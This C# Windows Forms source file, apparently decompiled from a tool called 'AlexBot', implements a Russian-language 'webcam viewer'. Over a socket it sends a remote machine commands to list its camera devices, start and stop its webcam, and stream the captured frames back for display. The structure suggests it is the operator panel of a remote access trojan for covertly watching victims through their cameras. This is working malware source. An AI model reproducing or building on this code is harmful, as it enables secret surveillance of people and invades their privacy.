using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace AlexBot
{
	public class WebCamViewer : Form
	{
		public Socket sock;

		public ToolSocket tsock;

		public bool View = false;

		private IContainer components = null;

		private StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private PictureBox pictureBox1;

		private ComboBox comboBox1;

		private Button button1;

		public WebCamViewer()
		{
			InitializeComponent();
		}

		public Bitmap ByteToImage(byte[] blob)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(blob, 0, Convert.ToInt32(blob.Length));
				Bitmap result = new Bitmap(memoryStream, useIcm: false);
				memoryStream.Dispose();
				return result;
			}
			catch (Exception)
			{
				return null;
			}
		}

		private void WebCam_View()
		{
			int _sel = 0;
			Action action = delegate
			{
				_sel = comboBox1.SelectedIndex;
			};
			if (base.InvokeRequired)
			{
				Invoke(action);
			}
			else
			{
				action();
			}
			tsock.sendCommand(sock, "webcam.start", Convert.ToString(_sel));
			while (View)
			{
				byte[] array = new byte[1048576];
				try
				{
					int bytes = sock.Receive(array);
					tsock.UpdateTraffic(sock, bytes, "read");
				}
				catch (SocketException)
				{
					action = delegate
					{
						Close();
					};
					if (base.InvokeRequired)
					{
						Invoke(action);
					}
					else
					{
						action();
					}
				}
				Bitmap bitmap = ByteToImage(array);
				try
				{
					if (bitmap != null)
					{
						action = delegate
						{
							pictureBox1.Image = bitmap;
						};
						if (base.InvokeRequired)
						{
							Invoke(action);
						}
						else
						{
							action();
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		private void WebCamViewerLoad(object sender, EventArgs e)
		{
			try
			{
				tsock.sendCommand(sock, "device.get", "1");
				comboBox1.Items.Clear();
				string text;
				if ((text = tsock.Read(1024, sock)) != null)
				{
					string[] array = text.Split('|');
					comboBox1.Items.AddRange(array);
					if (array.Length > 0)
					{
						comboBox1.SelectedIndex = 0;
					}
					else
					{
						MessageBox.Show("Драйвера Веб-Камеры не установлены на компьютере", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						Close();
					}
				}
				else
				{
					Close();
				}
			}
			catch (Exception)
			{
				MessageBox.Show("Драйвера Веб-Камеры не установлены на компьютере", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Close();
			}
		}

		private void Button1Click(object sender, EventArgs e)
		{
			if (!View)
			{
				View = true;
				button1.Text = "Стоп";
				Thread thread = new Thread(WebCam_View);
				thread.IsBackground = true;
				thread.Start();
			}
			else
			{
				tsock.sendCommand(sock, "webcam.close", "1");
				View = false;
				button1.Text = "Старт";
			}
		}

		private void WebCamViewerFormClosing(object sender, FormClosingEventArgs e)
		{
			tsock.sendCommand(sock, "webcam.close", "1");
			View = false;
		}

		private void WebCamViewerFormClosed(object sender, FormClosedEventArgs e)
		{
			tsock.sendCommand(sock, "webcam.close", "1");
			View = false;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			comboBox1 = new System.Windows.Forms.ComboBox();
			button1 = new System.Windows.Forms.Button();
			statusStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			statusStrip1.Dock = System.Windows.Forms.DockStyle.Top;
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1]
			{
				toolStripStatusLabel1
			});
			statusStrip1.Location = new System.Drawing.Point(0, 0);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Size = new System.Drawing.Size(401, 22);
			statusStrip1.TabIndex = 0;
			statusStrip1.Text = "statusStrip1";
			toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			toolStripStatusLabel1.Size = new System.Drawing.Size(129, 17);
			toolStripStatusLabel1.Text = "Выберите устройство:";
			pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
			pictureBox1.Location = new System.Drawing.Point(0, 22);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(401, 286);
			pictureBox1.TabIndex = 1;
			pictureBox1.TabStop = false;
			comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			comboBox1.FormattingEnabled = true;
			comboBox1.Location = new System.Drawing.Point(138, 1);
			comboBox1.Name = "comboBox1";
			comboBox1.Size = new System.Drawing.Size(121, 21);
			comboBox1.TabIndex = 2;
			button1.Location = new System.Drawing.Point(282, 1);
			button1.Name = "button1";
			button1.Size = new System.Drawing.Size(75, 21);
			button1.TabIndex = 3;
			button1.Text = "Старт";
			button1.UseVisualStyleBackColor = true;
			button1.Click += new System.EventHandler(Button1Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(401, 308);
			base.Controls.Add(button1);
			base.Controls.Add(comboBox1);
			base.Controls.Add(pictureBox1);
			base.Controls.Add(statusStrip1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			base.Name = "WebCamViewer";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Просмотр Веб-Камеры";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(WebCamViewerFormClosing);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(WebCamViewerFormClosed);
			base.Load += new System.EventHandler(WebCamViewerLoad);
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
